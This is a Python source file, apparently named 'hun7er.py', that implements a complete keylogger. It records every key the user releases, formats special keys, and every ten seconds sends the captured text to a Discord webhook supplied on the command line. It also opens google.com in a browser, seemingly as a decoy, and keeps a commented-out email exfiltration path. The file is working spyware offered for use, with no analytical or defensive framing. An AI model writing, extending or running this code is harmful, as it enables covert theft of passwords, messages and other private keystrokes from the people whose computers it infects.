import keyboard
from threading import Timer
from datetime import datetime
import webbrowser
from nextcord import SyncWebhook
import json
import requests
import sys

SEND_REPORT_EVERY = 10# in seconds
WEBHOOK_URL = ""


class Keylogger:
    def __init__(self, interval, url):
        self.interval = interval
        self.log = ""
        # record start & end date+time
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.url = url

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_hook(self):
        webhook = SyncWebhook.from_url(self.url)
        webhook.send(self.log)

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            #self.update_filename()
            self.report_to_hook()
            #self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        # start the timer
        timer.start()


    def start(self):
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

def main(argv):
    print(argv)
    print(WEBHOOK_URL)
    webbrowser.open("https://www.google.com")
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, url=argv)
    keylogger.start()

if __name__ == "__main__":
    try:
        main(sys.argv[1])
    except:
        print("Please provide a valid webhook URL and use it like this : \n python3 hun7er.py <webhookurl>")
